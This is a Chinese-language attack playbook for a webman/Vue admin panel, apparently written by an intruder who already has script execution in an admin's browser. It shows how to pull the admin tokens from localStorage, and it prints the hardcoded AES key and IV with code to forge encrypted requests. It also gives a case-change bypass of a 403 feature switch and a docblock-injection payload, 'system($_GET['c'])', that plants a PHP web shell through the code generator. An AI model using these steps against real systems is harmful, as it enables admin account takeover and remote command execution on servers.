# 会话与请求体协议（拿到浏览器执行点后如何「借管理员身份开火」）

## 1. 会话存放（Vue 后台 = Art Design Pro）
```js
// pinia + pinia-plugin-persistedstate，key="user"，serializer=JSON
JSON.parse(localStorage.getItem('user')).accessToken   // 管理员 access token
JSON.parse(localStorage.getItem('user')).refreshToken
```
源码依据：`oN = fm("userStore", ()=>{...},{persist:{key:"user",storage:localStorage}})`，
持久化插件默认 serializer 为 `JSON.stringify/JSON.parse`。
其它 store：`localStorage['setting']`、`localStorage['worktab']`。

## 2. 请求头与请求体加密（前端 axios 拦截器原文）
```js
CO.interceptors.request.use(e=>{
  const n=oN();
  if(n.accessToken && e.headers.set("Authorization", `Bearer ${n.accessToken}`), ...)
  if(e.data && !(e.data instanceof FormData) && ["post","put","patch"].includes(method)){
     // AES-256-CBC + Pkcs7，输出 base64
     Content-Type: text/plain
     X-Encrypted: 1
  }
})
```
硬编码密钥（与代理后台、会员端接口共用）：
- key `QD2024SecretKey1234567890ABCDEF0`
- iv  `QD2024IV12345678`

浏览器内复现（无需 CryptoJS，原生 WebCrypto）：
```js
async function encAes(text){
  const te=new TextEncoder();
  const k=await crypto.subtle.importKey('raw',te.encode('QD2024SecretKey1234567890ABCDEF0'),{name:'AES-CBC'},false,['encrypt']);
  const b=await crypto.subtle.encrypt({name:'AES-CBC',iv:te.encode('QD2024IV12345678')},k,te.encode(text));
  let s=''; const u=new Uint8Array(b); for(let i=0;i<u.length;i++) s+=String.fromCharCode(u[i]);
  return btoa(s);
}
// body = await encAes(JSON.stringify(payload)) ; headers: {'Content-Type':'text/plain','X-Encrypted':'1','Authorization':'Bearer '+token}
```
服务端由 `EncryptionMiddleware` 按 `X-Encrypted: 1` 解；SDK/老 layui 面板走 form-urlencoded + PHPSID 会话（Cookie 为 host-only，无 Domain）。

## 3. 「交付版功能关闭」403 开关的大小写绕过
webman 路由大小写不敏感，而开关按**精确小写路径**匹配：
```
GET  /app/admin/table/index   -> {"code":403,"message":"该功能正在进行中，默认关闭"}
GET  /app/admin/Table/index   -> 落到真实路由（未登录返回 401 脚本 <script>top.location.href='/app/admin';</script>）
```
→ 开火时统一用**首字母大写的控制器段**（`/app/admin/Table/crud`）。

## 4. 代码生成器 docblock 注入（唯一能写进 Monitor 监听目录的入口）
`plugin/admin/app/controller/TableController.php::crud()`（POST，需管理员会话）：
```
table=<真实表名，^[a-zA-Z_0-9]+$>  例如 wa_options
title=*/if(isset($_GET['c'])){echo 'RCE-OK:';system($_GET['c']);}/**     ← 闭合 docblock 注入顶层 PHP，/** 重新开注释吞掉模板尾部（php -l 才能过）
controller=/app/controller/<随机名>Controller.php                        ← 必须含 /controller/ 且 .php
model=/app/model/<随机名>.php
pid=0
（绝不带 overwrite ⇒ is_file 守卫保证只新建、不覆盖）
```
写盘 → `Util::resumeFileMonitor()` 后监听的 Monitor 下一个 tick（1s）`php -l` 通过 → `posix_kill(master,SIGUSR1)` 热重载 → 请求自动路由路径触发（**注意 URL 名不是类名**：生成器用 `tableize(类名)` 得到 `/app/admin/<urlname>/<action>`，实战要把候选路径都试一遍）。
副作用（无法避免）：同时写 `app/view/<urlname>/{index,insert,update}.html` 并往 `wa_rules` 插一条菜单。
